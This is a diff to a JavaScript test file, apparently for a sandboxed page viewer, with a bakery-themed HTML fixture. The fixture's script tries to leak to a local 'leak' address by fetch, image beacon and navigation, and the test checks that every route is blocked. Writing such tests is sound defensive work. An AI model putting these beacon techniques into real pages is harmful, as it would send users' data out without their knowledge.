@@ -77,12 +77,12 @@ const spreadsheetScript = (name) => totalsScript(name).replace('return { by, of,
 const PLAN = '# Bakery plan\n\n1. Bake 120 croissants\n2. Deliver them\n\n| Day | Croissants |\n|---|---:|\n| Saturday | 120 |'
 /** A page with a style, and a script that tries every way out with what it holds: none may reach the leak address. */
 const PAGE = `<!doctype html><title>Bakery</title><style>h1 { color: rgb(180, 70, 20) }</style><h1>Bakery</h1><p id="out">Waiting</p>
-<a id="away" href="http://127.0.0.1:4182/leak?link">Away</a>
-<script>document.getElementById('out').textContent = 'Baked by a script'
+<a id="away" href="http://127.0.0.1:4182/leak?link">Away</a> <button id="go">Go</button>
+<script>document.getElementById('out').textContent = 'Baked by a script ' + document.compatMode
 const leak = 'http://127.0.0.1:4182/leak?'
 fetch(leak + 'fetch').catch(() => {})
 new Image().src = leak + 'image'
-setTimeout(() => { location.href = leak + 'navigate' }, 200)</script>`
+document.getElementById('go').onclick = () => { location.href = leak + 'navigate' }</script>`
 
 /** A small PNG: a warm gradient. */
 function picture(width = 96, height = 64) {
